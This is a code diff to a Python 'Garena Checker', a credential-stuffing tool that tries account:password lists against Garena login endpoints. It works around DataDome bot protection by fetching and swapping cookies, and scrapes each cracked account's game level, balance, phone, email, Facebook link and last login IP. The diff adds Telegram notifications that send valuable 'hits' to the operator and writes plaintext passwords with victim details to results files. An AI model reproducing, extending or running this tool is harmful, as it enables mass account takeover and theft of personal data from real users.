@@ -15,7 +15,8 @@ import platform
 import uuid
 import sys
 import urllib3
-import signal
+import telebot
+from telebot import types
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -23,8 +24,14 @@ _GLOBAL_SUBSCRIPTION_ACTIVE = False
 _GLOBAL_DEVICE_ID = None
 _GLOBAL_USER_NAME = None
 
+TELEGRAM_BOT_TOKEN = None
+TELEGRAM_CHAT_ID = None
+TELEGRAM_ENABLED = False
+THREAD_COUNT = 1
+THREAD_SPEED = "normal"
+BATCH_COUNT = 0
 
-_ENCRYPTED_SUBSCRIPTION_API_URL_PART1 = "48747470733a2f2f6461726b7864656174682e6f6e72656e6465722e636f6d2f"
+_ENCRYPTED_SUBSCRIPTION_API_URL_PART1 = "48747470733a2f2f61736878646561746831302e7831302e627a2f"
 _ENCRYPTED_SUBSCRIPTION_API_URL_PART2 = "6170692e706870"
 
 def _get_decrypted_subscription_api_url():
@@ -120,6 +127,7 @@ def device_main():
     if status == "active":
         logger.info(f"Subscription Status: Active. Access granted! {message}")
         _GLOBAL_SUBSCRIPTION_ACTIVE = True
+        input(f"\n{colorama.Fore.CYAN}Press Enter to proceed...{colorama.Style.RESET_ALL}")
         return True
     elif status in ["pending", "registered_pending"]:
         logger.warning(f"Subscription Status: Pending Approval. {message}")
@@ -141,7 +149,6 @@ class ColoredFormatter(logging.Formatter):
         'WARNING': colorama.Fore.YELLOW,
         'ERROR': colorama.Fore.RED,
         'CRITICAL': colorama.Fore.RED + colorama.Back.WHITE,
-        'ORANGE': '\033[38;5;214m'
     }
     RESET = colorama.Style.RESET_ALL
 
@@ -151,11 +158,11 @@ class ColoredFormatter(logging.Formatter):
             record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
         return super().format(record)
 
-logger = logging.getLogger(__name__)
+logger = logging.getLogger()
 handler = logging.StreamHandler()
 handler.setFormatter(ColoredFormatter())
 logger.addHandler(handler)
-logger.setLevel(logging.DEBUG)
+logger.setLevel(logging.INFO)
 logging.getLogger("urllib3").setLevel(logging.ERROR)
 logging.getLogger("requests").setLevel(logging.ERROR)
 
@@ -198,7 +205,7 @@ class LiveStats:
             
     def display_stats(self):
         stats = self.get_stats()
-        return f"[LIVE STATS] VALID [{stats['valid']}] | INVALID [{stats['invalid']}] | CLEAN [{stats['clean']}] | NOT CLEAN [{stats['not_clean']}] | CODM [{stats['codm']}] | NO CODM [{stats['no_codm']}] -> config @poqruette"
+        return f"{colorama.Fore.CYAN}[LIVE STATS]{colorama.Fore.GREEN} VALID [{stats['valid']}]{colorama.Fore.RED} | INVALID [{stats['invalid']}]{colorama.Fore.GREEN} | CLEAN [{stats['clean']}]{colorama.Fore.YELLOW} | NOT CLEAN [{stats['not_clean']}]{colorama.Fore.BLUE} | CODM [{stats['codm']}]{colorama.Fore.MAGENTA} | NO CODM [{stats['no_codm']}]{colorama.Style.RESET_ALL}"
 
 class CookieManager:
     def __init__(self):
@@ -246,7 +253,6 @@ class DataDomeManager:
             self.datadome_history.append(datadome_cookie)
             if len(self.datadome_history) > 10:
                 self.datadome_history.pop(0)
-            logger.info(f"[INFO] DataDome cookie updated: {datadome_cookie[:30]}...")
             
     def get_datadome(self):
         return self.current_datadome
@@ -259,16 +265,15 @@ class DataDomeManager:
                 self.set_datadome(datadome_cookie)
                 return datadome_cookie
             return None
-        except Exception as e:
-            logger.warning(f"[WARNING] Error extracting datadome from session: {e}")
+        except Exception:
             return None
         
     def clear_session_datadome(self, session):
         try:
             if 'datadome' in session.cookies:
                 del session.cookies['datadome']
-        except Exception as e:
-            logger.warning(f"[WARNING] Error clearing datadome cookies: {e}")
+        except Exception:
+            pass
         
     def set_session_datadome(self, session, datadome_cookie=None):
         try:
@@ -278,8 +283,7 @@ class DataDomeManager:
                 session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                 return True
             return False
-        except Exception as e:
-            logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
+        except Exception:
             return False
 
     def handle_403(self, session):
@@ -302,6 +306,217 @@ class DataDomeManager:
                 logger.error(f"[ERROR] Failed to auto-fetch DataDome cookie")
                 return False
         return False
+
+def display_banner():
+    banner = """
+          e$$$$e.
+       e$$$$$$$$$$e
+     $$$$$$$$$$$$$$
+     d$$$$$$$$$$$$$$b
+     $$$$$$$$$$$$$$$$
+    4$$$$$$$$$$$$$$$$F
+    4$$$$$$$$$$$$$$$$F
+     $$$" "$$$$" "$$$
+     $$F   4$$F   4$$
+     '$F   4$$F   4$"
+      $$   $$$$   $P
+      4$$$$$"^$$$$$%
+       $$$$F  4$$$$
+        "$$$ee$$$"
+        . *$$$$F4
+         $     .$
+         "$$$$$$"
+          ^$$$$
+ 4$$c       ""       .$$r
+ ^$$$b              e$$$"
+ d$$$$$e          z$$$$$b
+4$$$*$$$$$c    .$$$$$*$$$r
+ ""    ^*$$$be$$$*"    ^"
+          "$$$$"
+        .d$$P$$$b
+       d$$P   ^$$$b
+   .ed$$$"      "$$$be.
+ $$$$$$P          *$$$$$$
+4$$$$$P            $$$$$$"
+ "*$$$"            ^$$P
+    ""              ^"
+    ( Garena Checker )
+    Owner: @poqruette
+    """
+    print(banner)
+
+def setup_telegram():
+    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_ENABLED
+    
+    print(f"\n{colorama.Fore.CYAN}📱 TELEGRAM NOTIFICATION SETUP{colorama.Style.RESET_ALL}")
+    print("=" * 50)
+    
+    use_telegram = input("Do you want to enable Telegram notifications for high-level hits (101-400)? (y/n): ").strip().lower()
+    
+    if use_telegram == 'y':
+        TELEGRAM_ENABLED = True
+        TELEGRAM_BOT_TOKEN = input("Enter your Telegram Bot Token: ").strip()
+        TELEGRAM_CHAT_ID = input("Enter your Chat ID: ").strip()
+        
+        config = {
+            'telegram_enabled': True,
+            'bot_token': TELEGRAM_BOT_TOKEN,
+            'chat_id': TELEGRAM_CHAT_ID
+        }
+        
+        with open('config.json', 'w') as f:
+            json.dump(config, f, indent=4)
+    else:
+        TELEGRAM_ENABLED = False
+
+def load_telegram_config():
+    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_ENABLED
+    
+    if os.path.exists('config.json'):
+        try:
+            with open('config.json', 'r') as f:
+                config = json.load(f)
+                TELEGRAM_ENABLED = config.get('telegram_enabled', False)
+                TELEGRAM_BOT_TOKEN = config.get('bot_token')
+                TELEGRAM_CHAT_ID = config.get('chat_id')
+        except:
+            pass
+
+def send_telegram_notification(account_data):
+    if not TELEGRAM_ENABLED or not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        return
+    
+    try:
+        bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
+        
+        codm_level = account_data.get('codm_level', 0)
+        try:
+            codm_level = int(codm_level)
+        except:
+            codm_level = 0
+            
+        if 101 <= codm_level <= 400:
+            message = format_telegram_message(account_data)
+            bot.send_message(TELEGRAM_CHAT_ID, message, parse_mode='HTML')
+            
+    except Exception:
+        pass
+
+def format_telegram_message(account_data):
+    account = account_data.get('account', 'N/A')
+    shells = account_data.get('shells', 'N/A')
+    codm_info = account_data.get('codm_info', {})
+    security = account_data.get('security', {})
+    facebook = account_data.get('facebook', {})
+    
+    message = f"""
+🚨 <b>NEW HIT DETECTED!</b> 🚨
+
+📱 <b>Account Details:</b>
+➤ Account: <code>{account}</code>
+➤ Shells: {shells}
+
+🎮 <b>CODM Info ({codm_info.get('region', 'N/A')}):</b>
+➤ Nickname: {codm_info.get('nickname', 'N/A')}
+➤ Level: {codm_info.get('level', 'N/A')}
+➤ UID: {codm_info.get('uid', 'N/A')}
+➤ Country: {codm_info.get('country', 'N/A')}
+
+🛡️ <b>Security Status:</b>
+➤ Mobile: {security.get('mobile', 'None')}
+➤ Email: {security.get('email', 'None')}
+➤ Facebook: {facebook.get('username', 'None')} - {facebook.get('link', 'None')}
+
+<i>Config By ➤ @poqruette</i>
+"""
+    return message
+
+def setup_threads():
+    global THREAD_COUNT, THREAD_SPEED
+    
+    print(f"\n{colorama.Fore.CYAN}⚡ THREAD CONFIGURATION{colorama.Style.RESET_ALL}")
+    print("=" * 50)
+    print("[1] 1-3 Threads (Recommended)")
+    print("[2] 4-6 Threads (Medium Risky)")
+    print("[3] 7-10 Threads (Very Risky!)")
+    print("[4] Normal Speed (Recommended)")
+    
+    choice = input("\nSelect thread option (1-4): ").strip()
+    
+    if choice == '1':
+        THREAD_COUNT = random.randint(1, 3)
+        THREAD_SPEED = "slow"
+    elif choice == '2':
+        THREAD_COUNT = random.randint(4, 6)
+        THREAD_SPEED = "medium"
+    elif choice == '3':
+        THREAD_COUNT = random.randint(7, 10)
+        THREAD_SPEED = "fast"
+    elif choice == '4':
+        THREAD_COUNT = 1
+        THREAD_SPEED = "normal"
+    else:
+        THREAD_COUNT = 1
+        THREAD_SPEED = "normal"
+
+def format_account_output(account, password, status, details=None, codm_info=None, count=0):
+    username_only = account.split(':')[0] if ':' in account else account
+    
+    if status == "success":
+        output = f"{colorama.Fore.CYAN}[{count}] {colorama.Fore.WHITE}Checking {username_only}\n"
+        output += f"{colorama.Fore.GREEN}-> Status: {status}{colorama.Style.RESET_ALL}\n"
+        
+        if details:
+            output += f"   {colorama.Fore.YELLOW}-> Country: {details.get('country', 'N/A')}{colorama.Style.RESET_ALL}\n"
+            output += f"   {colorama.Fore.YELLOW}-> Garena Shells: {details.get('shells', 'N/A')}{colorama.Style.RESET_ALL}\n"
+            output += f"   {colorama.Fore.YELLOW}-> Mobile: {details.get('mobile', 'None')}{colorama.Style.RESET_ALL}\n"
+            
+            email = details.get('email', 'None')
+            email_verified = details.get('email_verified', False)
+            if email != 'None':
+                email_status = f"{email} (Verified)" if email_verified else f"{email} (Not Verified)"
+                output += f"   {colorama.Fore.YELLOW}-> Email: {email_status}{colorama.Style.RESET_ALL}\n"
+            else:
+                output += f"   {colorama.Fore.YELLOW}-> Email: None{colorama.Style.RESET_ALL}\n"
+                
+            output += f"   {colorama.Fore.YELLOW}-> FB Username: {details.get('fb_username', 'N/A')}{colorama.Style.RESET_ALL}\n"
+            output += f"   {colorama.Fore.YELLOW}-> FB Link: {details.get('fb_link', 'N/A')}{colorama.Style.RESET_ALL}\n"
+            
+            last_login = details.get('last_login', {})
+            output += f"   {colorama.Fore.YELLOW}-> Last Login: {last_login.get('date', 'N/A')}{colorama.Style.RESET_ALL}\n"
+            output += f"   {colorama.Fore.YELLOW}-> Login Source: {last_login.get('source', 'N/A')}{colorama.Style.RESET_ALL}\n"
+            output += f"   {colorama.Fore.YELLOW}-> IP: {last_login.get('ip', 'N/A')}{colorama.Style.RESET_ALL}\n"
+            output += f"   {colorama.Fore.YELLOW}-> IP Country: {last_login.get('country', 'N/A')}{colorama.Style.RESET_ALL}\n"
+            
+            output += f"{colorama.Fore.CYAN}-> Connected Games:{colorama.Style.RESET_ALL}\n"
+            games = details.get('game_info', [])
+            for game in games:
+                output += f"   {colorama.Fore.WHITE}-> {game}{colorama.Style.RESET_ALL}\n"
+            
+            if codm_info:
+                output += f"{colorama.Fore.CYAN}-> CODM Info:{colorama.Style.RESET_ALL}\n"
+                output += f"   {colorama.Fore.WHITE}-> CODM Nickname: {codm_info.get('codm_nickname', 'N/A')}{colorama.Style.RESET_ALL}\n"
+                output += f"   {colorama.Fore.WHITE}-> CODM Level: {codm_info.get('codm_level', 'N/A')}{colorama.Style.RESET_ALL}\n"
+                output += f"   {colorama.Fore.WHITE}-> CODM UID: {codm_info.get('uid', 'N/A')}{colorama.Style.RESET_ALL}\n"
+                
+            output += f"{colorama.Fore.CYAN}-> Security:{colorama.Style.RESET_ALL}\n"
+            output += f"   {colorama.Fore.WHITE}-> Mobile Bound: {details.get('mobile_bound', 'False')}{colorama.Style.RESET_ALL}\n"
+            output += f"   {colorama.Fore.WHITE}-> Authenticator: {details.get('authenticator', 'Disabled')}{colorama.Style.RESET_ALL}\n"
+            output += f"   {colorama.Fore.WHITE}-> 2FA: {details.get('two_fa', 'Disabled')}{colorama.Style.RESET_ALL}\n"
+            output += f"   {colorama.Fore.WHITE}-> Account Status: {details.get('account_status', 'Clean')}{colorama.Style.RESET_ALL}\n"
+            output += f"   {colorama.Fore.MAGENTA}-> Config By @poqruette{colorama.Style.RESET_ALL}\n"
+            
+    else:
+        output = f"{colorama.Fore.CYAN}[{count}] {colorama.Fore.WHITE}Checking {username_only}\n"
+        if "error_auth" in status or "error_no_account" in status:
+            output += f"{colorama.Fore.RED}-> Status: {status}{colorama.Style.RESET_ALL}\n"
+        else:
+            output += f"{colorama.Fore.YELLOW}-> Status: {status}{colorama.Style.RESET_ALL}\n"
+    
+    return output
+
+def format_cookie_message(count, datadome):
+    return f"{colorama.Fore.CYAN}[BATCH #{count}] {colorama.Fore.GREEN}NEW COOKIE FOUND! Setting Datadome: {datadome[:30]}...{colorama.Style.RESET_ALL}"
 
 def encode(plaintext, key):
     key = bytes.fromhex(key)
@@ -333,15 +548,12 @@ def applyck(session, cookie_str):
                 if key and value:
                     cookie_dict[key] = value
             except (ValueError, IndexError):
-                logger.warning(f"[WARNING] Skipping invalid cookie component: {item}")
+                pass
         else:
-            logger.warning(f"[WARNING] Skipping malformed cookie (no '='): {item}")
+            pass
     
     if cookie_dict:
         session.cookies.update(cookie_dict)
-        logger.info(f"[SUCCESS] Applied {len(cookie_dict)} cookies")
-    else:
-        logger.warning(f"[WARNING] No valid cookies found in the provided string")
 
 def get_datadome_cookie(session):
     url = 'https://dd.garena.com/js/'
@@ -401,13 +613,12 @@ def get_datadome_cookie(session):
     
     for attempt in range(retries):
         try:
-            response = session.post(url, headers=headers, data=data, timeout=30)
+            response = session.post(url, headers=headers, data=data, timeout=10)
             response.raise_for_status()
             
             try:
                 response_json = response.json()
             except json.JSONDecodeError:
-                logger.error(f"[ERROR] Invalid JSON response from DataDome")
                 if attempt < retries - 1:
                     time.sleep(2)
                     continue
@@ -420,20 +631,16 @@ def get_datadome_cookie(session):
                 else:
                     datadome = cookie_string
                     
-                logger.info(f"[SUCCESS] DataDome cookie found: {datadome[:30]}...")
                 return datadome
             else:
-                logger.warning(f"[WARNING] DataDome cookie not found. Status: {response_json.get('status')}")
                 if attempt < retries - 1:
                     time.sleep(2)
                     continue
                     
-        except requests.exceptions.RequestException as e:
-            logger.error(f"[ERROR] Error getting DataDome cookie (attempt {attempt + 1}): {e}")
+        except requests.exceptions.RequestException:
             if attempt < retries - 1:
                 time.sleep(2)
-        except Exception as e:
-            logger.error(f"[ERROR] Unexpected error getting DataDome cookie: {e}")
+        except Exception:
             if attempt < retries - 1:
                 time.sleep(2)
     
@@ -443,7 +650,6 @@ def prelogin(session, account, datadome_manager):
     global _GLOBAL_SUBSCRIPTION_ACTIVE, _GLOBAL_DEVICE_ID
     
     if not _GLOBAL_SUBSCRIPTION_ACTIVE:
-        logger.error(f"🔒 Subscription not active. Cannot perform prelogin for {account}")
         return None, None, None
 
     url = 'https://sso.garena.com/api/prelogin'
@@ -475,10 +681,9 @@ def prelogin(session, account, datadome_manager):
     retries = 3
     for attempt in range(retries):
         try:
-            response = session.get(url, headers=headers, params=params, timeout=30)
+            response = session.get(url, headers=headers, params=params, timeout=10)
             
             if response.status_code == 403:
-                logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1})")
                 if datadome_manager.handle_403(session):
                     return "IP_BLOCKED", None, None
                 if attempt < retries - 1:
@@ -491,7 +696,6 @@ def prelogin(session, account, datadome_manager):
             try:
                 data = response.json()
             except json.JSONDecodeError:
-                logger.error(f"[ERROR] Invalid JSON response from prelogin for {account}")
                 if attempt < retries - 1:
                     time.sleep(2)
                     continue
@@ -501,26 +705,22 @@ def prelogin(session, account, datadome_manager):
             try:
                 cookies_dict = response.cookies.get_dict()
                 new_datadome = cookies_dict.get('datadome')
-            except Exception as e:
-                logger.warning(f"[WARNING] Error extracting datadome from prelogin response: {e}")
+            except Exception:
+                pass
             
             if 'error' in data:
-                logger.error(f"[ERROR] Prelogin error for {account}: {data['error']}")
                 return None, None, new_datadome
                 
             v1 = data.get('v1')
             v2 = data.get('v2')
             
             if not v1 or not v2:
-                logger.error(f"[ERROR] Missing v1 or v2 in prelogin response for {account}")
                 return None, None, new_datadome
                 
-            logger.info(f"[SUCCESS] Prelogin successful: {account}")
             return v1, v2, new_datadome
             
         except requests.exceptions.HTTPError as e:
             if e.response.status_code == 403:
-                logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1})")
                 if datadome_manager.handle_403(session):
                     return "IP_BLOCKED", None, None
                 if attempt < retries - 1:
@@ -528,12 +728,10 @@ def prelogin(session, account, datadome_manager):
                     continue
                 return None, None, None
             else:
-                logger.error(f"[ERROR] HTTP error fetching prelogin data for {account} (attempt {attempt + 1}): {e}")
                 if attempt < retries - 1:
                     time.sleep(2)
                     continue
-        except Exception as e:
-            logger.error(f"[ERROR] Error fetching prelogin data for {account} (attempt {attempt + 1}): {e}")
+        except Exception:
             if attempt < retries - 1:
                 time.sleep(2)
                 
@@ -559,13 +757,12 @@ def login(session, account, password, v1, v2):
     retries = 3
     for attempt in range(retries):
         try:
-            response = session.get(url, headers=headers, params=params, timeout=30)
+            response = session.get(url, headers=headers, params=params, timeout=10)
             response.raise_for_status()
             
             try:
                 data = response.json()
             except json.JSONDecodeError:
-                logger.error(f"[ERROR] Invalid JSON response from login for {account}")
                 if attempt < retries - 1:
                     time.sleep(2)
                     continue
@@ -575,21 +772,16 @@ def login(session, account, password, v1, v2):
             
             if 'error' in data:
                 error_msg = data['error']
-                logger.error(f"[ERROR] Login failed for {account}: {error_msg}")
                 
                 if error_msg == 'error_auth':
-                    logger.warning(f"[WARNING] Authentication error - likely invalid credentials for {account}")
                     return None
                 elif 'captcha' in error_msg.lower():
-                    logger.warning(f"[WARNING] Captcha required for {account}")
                     time.sleep(3)
                     continue
                     
-            logger.info(f"[SUCCESS] Logged in: {account}")
             return sso_key
             
-        except requests.RequestException as e:
-            logger.error(f"[ERROR] Login request failed for {account} (attempt {attempt + 1}): {e}")
+        except requests.RequestException:
             if attempt < retries - 1:
                 time.sleep(2)
                 
@@ -611,8 +803,7 @@ def get_codm_access_token(session):
         token_response = session.post(token_url, headers=token_headers, data=token_data)
         token_data = token_response.json()
         return token_data.get("access_token", "")
-    except Exception as e:
-        logger.error(f"❌ Error getting CODM access token: {e}")
+    except Exception:
         return ""
 
 def process_codm_callback(session, access_token):
@@ -668,8 +859,7 @@ def process_codm_callback(session, access_token):
         else:
             return None, "unknown_error"
             
-    except Exception as e:
-        logger.error(f"❌ Error processing CODM callback: {e}")
+    except Exception:
         return None, "error"
 
 def get_codm_user_info(session, token):
@@ -708,8 +898,7 @@ def get_codm_user_info(session, token):
             }
         return {}
         
-    except Exception as e:
-        logger.error(f"❌ Error getting CODM user info: {e}")
+    except Exception:
         return {}
 
 def check_codm_account(session, account):
@@ -719,58 +908,23 @@ def check_codm_account(session, account):
     try:
         access_token = get_codm_access_token(session)
         if not access_token:
-            logger.warning(f"⚠️ No CODM access token for {account}")
             return has_codm, codm_info
         
         codm_token, status = process_codm_callback(session, access_token)
         
         if status == "no_codm":
-            logger.info(f"⚠️ No CODM detected for {account}")
             return has_codm, codm_info
         elif status != "success" or not codm_token:
-            logger.warning(f"⚠️ CODM callback failed for {account}: {status}")
             return has_codm, codm_info
         
         codm_info = get_codm_user_info(session, codm_token)
         if codm_info:
             has_codm = True
-            logger.info(f"✅ CODM detected for {account}: Level {codm_info.get('codm_level', 'N/A')}")
             
-    except Exception as e:
-        logger.error(f"❌ Error checking CODM for {account}: {e}")
+    except Exception:
+        pass
     
     return has_codm, codm_info
-
-def display_codm_info(account, codm_info):
-    if not codm_info:
-        return ""
-    
-    display_text = f" | CODM: {codm_info.get('codm_nickname', 'N/A')} (Level {codm_info.get('codm_level', 'N/A')})"
-    
-    region = codm_info.get('region', '')
-    if region and region != 'N/A':
-        display_text += f" [{region.upper()}]"
-    
-    return display_text
-
-def save_codm_account(account, password, codm_info):
-    if not codm_info:
-        return
-    
-    try:
-        if not os.path.exists('Results'):
-            os.makedirs('Results')
-            
-        with open('Results/codm_accounts.txt', 'a', encoding='utf-8') as f:
-            f.write(f"{account}:{password} | ")
-            f.write(f"Nickname: {codm_info.get('codm_nickname', 'N/A')} | ")
-            f.write(f"Level: {codm_info.get('codm_level', 'N/A')} | ")
-            f.write(f"Region: {codm_info.get('region', 'N/A')} | ")
-            f.write(f"UID: {codm_info.get('uid', 'N/A')}\n")
-            
-        logger.info(f"💾 Saved CODM account: {account}")
-    except Exception as e:
-        logger.error(f"❌ Error saving CODM account {account}: {e}")
 
 def get_game_connections(session, account):
     game_info = []
@@ -819,8 +973,6 @@ def get_game_connections(session, account):
     }
 
     try:
-        logger.info(f"[INFO] CHECKING GAME CONNECTIONS...")
-        
         token_url = "https://authgop.garena.com/oauth/token/grant"
         token_headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
@@ -830,17 +982,15 @@ def get_game_connections(session, account):
         }
         token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}"
         
-        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=30)
+        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=10)
         
         try:
             token_data = token_response.json()
             access_token = token_data.get("access_token", "")
         except json.JSONDecodeError:
-            logger.error(f"[ERROR] Invalid JSON response from token grant for {account}")
             return ["No game connections found"]
         
         if not access_token:
-            logger.warning(f"[WARNING] No access token for {account}")
             return ["No game connections found"]
 
         inspect_url = "https://shop.garena.sg/api/auth/inspect_token"
@@ -852,22 +1002,18 @@ def get_game_connections(session, account):
         }
         inspect_data = {"token": access_token}
         
-        inspect_response = session.post(inspect_url, headers=inspect_headers, json=inspect_data, timeout=30)
+        inspect_response = session.post(inspect_url, headers=inspect_headers, json=inspect_data, timeout=10)
         session_key_roles = inspect_response.cookies.get('session_key')
         if not session_key_roles:
-            logger.warning(f"[WARNING] No session_key in response cookies for {account}")
             return ["No game connections found"]
         
         try:
             inspect_data = inspect_response.json()
         except json.JSONDecodeError:
-            logger.error(f"[ERROR] Invalid JSON response from token inspect for {account}")
             return ["No game connections found"]
             
         uac = inspect_data.get("uac", "ph").lower()
         region = uac if uac in valid_regions else 'ph'
-        
-        logger.info(f"[REGION] {region.upper()}")
         
         if region == 'th' or region == 'in':
             base_domain = "termgame.com"
@@ -880,6 +1026,7 @@ def get_game_connections(session, account):
         
         applicable_games = game_mappings.get(region, game_mappings['default'])
         detected_roles = {}
+        found_games = []
         
         for app_id, game_name in applicable_games.items():
             roles_url = f"https://{base_domain}/api/shop/apps/roles"
@@ -898,12 +1045,11 @@ def get_game_connections(session, account):
             }
             
             try:
-                roles_response = session.get(roles_url, params=params_roles, headers=headers_roles, timeout=30)
+                roles_response = session.get(roles_url, params=params_roles, headers=headers_roles, timeout=10)
                 
                 try:
                     roles_data = roles_response.json()
                 except json.JSONDecodeError:
-                    print(f"{colorama.Fore.RED}[NOT FOUND] {game_name}..{colorama.Style.RESET_ALL}")
                     continue
                 
                 role = None
@@ -914,22 +1060,17 @@ def get_game_connections(session, account):
                 
                 if role:
                     detected_roles[app_id] = role
-                    game_info.append(f"[{region.upper()} - {game_name} - {role}]")
-                    print(f"{colorama.Fore.GREEN}[FOUND] {game_name} - {role}{colorama.Style.RESET_ALL}")
-                else:
-                    print(f"{colorama.Fore.RED}[NOT FOUND] {game_name}..{colorama.Style.RESET_ALL}")
+                    found_games.append(game_name)
+                    game_info.append(f"{region.upper()} - {game_name} - {role}")
             
-            except Exception as e:
-                logger.warning(f"[WARNING] Error checking game {game_name} for {account}: {e}")
-                print(f"{colorama.Fore.RED}[NOT FOUND] {game_name}..{colorama.Style.RESET_ALL}")
+            except Exception:
+                continue
         
         if not game_info:
-            game_info.append(f"[{region.upper()} - No Game Detected]")
-            logger.info(f"[INFO] No games detected")
+            game_info.append(f"{region.upper()} - No Game Detected")
             
-    except Exception as e:
-        logger.error(f"[ERROR] Error getting game connections for {account}: {e}")
-        game_info.append("[Error fetching game data]")
+    except Exception:
+        game_info.append("Error fetching game data")
     
     return game_info
 
@@ -950,6 +1091,23 @@ def parse_account_details(data):
     email_verified = bool(user_info.get('email_v', 0))
     email_actually_bound = bool(email != 'N/A' and email and email_verified)
     
+    login_history = data.get('login_history', [])
+    last_login_info = login_history[0] if login_history else {}
+    last_login = last_login_info.get('timestamp', 0)
+    last_login_date = time.strftime("%Y-%m-%d %H:%M", time.localtime(last_login)) if last_login else "N/A"
+    last_login_where = last_login_info.get('source', 'Unknown')
+    ipk = last_login_info.get('ip', 'N/A')
+    ipc = last_login_info.get('country', 'N/A')
+    
+    fb_account = user_info.get('fb_account')
+    if isinstance(fb_account, dict):
+        fb_username = fb_account.get('fb_username', '')
+        fb_uid = fb_account.get('fb_uid', '')
+        fb_link = f"https://facebook.com/{fb_uid}" if fb_uid else "N/A"
+    else:
+        fb_username = fb_account if fb_account else "None"
+        fb_link = f"https://facebook.com/{fb_account}" if fb_account else "N/A"
+    
     account_info = {
         'uid': user_info.get('uid', 'N/A'),
         'username': user_info.get('username', 'N/A'),
@@ -964,7 +1122,7 @@ def parse_account_details(data):
             'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
             'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
             'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
-            'facebook_account': user_info.get('fb_account', None),
+            'facebook_account': fb_username,
             'suspicious': bool(user_info.get('suspicious', False))
         },
         
@@ -992,6 +1150,18 @@ def parse_account_details(data):
             'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
         },
         
+        'last_login': {
+            'date': last_login_date,
+            'source': last_login_where,
+            'ip': ipk,
+            'country': ipc
+        },
+        
+        'fb_info': {
+            'username': fb_username,
+            'link': fb_link
+        },
+        
         'binds': [],
         'game_info': []
     }
@@ -1017,9 +1187,9 @@ def parse_account_details(data):
     if account_info['security']['authenticator_app']:
         security_indicators.append("Auth App")
     if account_info['security']['suspicious']:
-        security_indicators.append("⚠️ Suspicious")
+        security_indicators.append("Suspicious")
     
-    account_info['security_status'] = "✅ Normal" if not security_indicators else " | ".join(security_indicators)
+    account_info['security_status'] = "Normal" if not security_indicators else " | ".join(security_indicators)
 
     return account_info
 
@@ -1033,105 +1203,125 @@ def save_account_details(account, password, details, codm_info=None):
         codm_region = codm_info.get('region', 'N/A') if codm_info else 'N/A'
         codm_level = codm_info.get('codm_level', 'N/A') if codm_info else 'N/A'
 
+        separator = "---------------------------------------------------\n"
+        
+        # Save account:password format in valid_accounts.txt
         with open('valid_accounts.txt', 'a', encoding='utf-8') as f:
-            f.write(f"account: {account} | name: {codm_name} | uid: {codm_uid} | region: {codm_region}\n")
+            f.write(f"{account}:{password} | name: {codm_name} | uid: {codm_uid} | region: {codm_region}\n")
+        
+        account_output = f"{separator}"
+        account_output += f"-> Account: {account}:{password}\n"  # Include password here
+        account_output += f"   -> Country: {details.get('personal', {}).get('country', 'N/A')}\n"
+        account_output += f"   -> Garena Shells: {details.get('profile', {}).get('shell_balance', 'N/A')}\n"
+        account_output += f"   -> Mobile: {details.get('personal', {}).get('mobile_no', 'None')}\n"
+        
+        email = details.get('email', 'None')
+        email_verified = details.get('email_verified', False)
+        if email != 'None':
+            email_status = f"{email} ({'Verified' if email_verified else 'Not Verified'})"
+            account_output += f"   -> Email: {email_status}\n"
+        else:
+            account_output += f"   -> Email: None\n"
+            
+        account_output += f"   -> FB Username: {details.get('fb_info', {}).get('username', 'N/A')}\n"
+        account_output += f"   -> FB Link: {details.get('fb_info', {}).get('link', 'N/A')}\n"
+        
+        last_login = details.get('last_login', {})
+        account_output += f"   -> Last Login: {last_login.get('date', 'N/A')}\n"
+        account_output += f"   -> Login Source: {last_login.get('source', 'N/A')}\n"
+        account_output += f"   -> IP: {last_login.get('ip', 'N/A')}\n"
+        account_output += f"   -> IP Country: {last_login.get('country', 'N/A')}\n"
+        
+        account_output += f"-> Connected Games:\n"
+        games = details.get('game_info', [])
+        for game in games:
+            account_output += f"   -> {game}\n"
+        
+        if codm_info:
+            account_output += f"-> CODM Info:\n"
+            account_output += f"    -> CODM Nickname: {codm_name}\n"
+            account_output += f"    -> CODM Level: {codm_level}\n"
+            account_output += f"    -> CODM UID: {codm_uid}\n"
+            
+        account_output += f"-> Security:\n"
+        account_output += f"   -> Mobile Bound: {details.get('personal', {}).get('mobile_actually_bound', False)}\n"
+        account_output += f"   -> Authenticator: {'Enabled' if details.get('security', {}).get('authenticator_app') else 'Disabled'}\n"
+        account_output += f"   -> 2FA: {'Enabled' if details.get('security', {}).get('two_step_verify') else 'Disabled'}\n"
+        account_output += f"   -> Account Status: {'Clean' if details.get('is_clean') else 'Not Clean'}\n"
+        account_output += f"   -> Config By @poqruette\n"
+        account_output += f"{separator}"
         
         if details['is_clean']:
             with open('Results/clean_accounts.txt', 'a', encoding='utf-8') as f:
-                f.write(f"{account}:{password}\n")
+                f.write(account_output)
             
             if codm_info:
                 with open('Results/clean_codm.txt', 'a', encoding='utf-8') as f:
-                    f.write(f"{account}:{password} | CODM: {codm_name} | Level: {codm_level} | Region: {codm_region} | UID: {codm_uid}\n")
+                    f.write(account_output)
         else:
-            bind_info = ', '.join(details['binds'])
             with open('Results/notclean_accounts.txt', 'a', encoding='utf-8') as f:
-                f.write(f"{account}:{password} | Binds: {bind_info}\n")
+                f.write(account_output)
             
             if codm_info:
                 with open('Results/notclean_codm.txt', 'a', encoding='utf-8') as f:
